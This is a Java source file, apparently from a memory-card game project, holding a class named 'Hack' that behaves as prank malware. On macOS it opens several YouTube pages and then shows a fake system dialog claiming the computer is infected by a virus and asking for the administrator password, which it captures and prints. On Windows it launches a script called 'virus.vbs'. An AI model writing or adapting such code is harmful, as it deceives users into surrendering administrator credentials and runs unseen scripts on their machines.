package jrJava.memoryCard_3;

import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.stream.Collectors;
import java.awt.AWTException;
import java.io.*;
public class Hack {
	Random rd= new Random();
	String os_name=System.getProperty("os.name").toLowerCase();
	public void beAnnoying() throws AWTException, IOException{
		if (os_name.contains("mac os")) {
			final Process p = new ProcessBuilder("open", "-a", "Google Chrome", "https://www.youtube.com/watch?v=vTIIMJ9tUc8","https://www.youtube.com/watch?v=3M_5oYU-IsU","https://www.youtube.com/watch?v=L_jWHffIx5E","https://www.youtube.com/watch?v=dQw4w9WgXcQ","https://www.youtube.com/watch?v=LDU_Txk06tM").start();
			var password=""; 
			String[] commandToRun = { "osascript", "-e", "set theResponse to display dialog \"You have been infected by a virus. Enter administrator password to continue\" default answer \"\" with icon caution buttons {\"Continue\"} default button \"Continue\" with hidden answer\n" + 
					"return theResponse" };
			Runtime run = Runtime.getRuntime();
			InputStream inputStream=run.exec(commandToRun).getInputStream();
			password=new BufferedReader(new InputStreamReader(inputStream)).lines().collect(Collectors.joining("\n"));
			System.out.println(password);
		
		
		
		
		}
		else {
			String[] commandToRun = {"cmd.exe","/c","start", "cd eclipse-workspace", "virus.vbs"};
			Runtime run = Runtime.getRuntime();
			run.exec(commandToRun);
		}
	}
	}

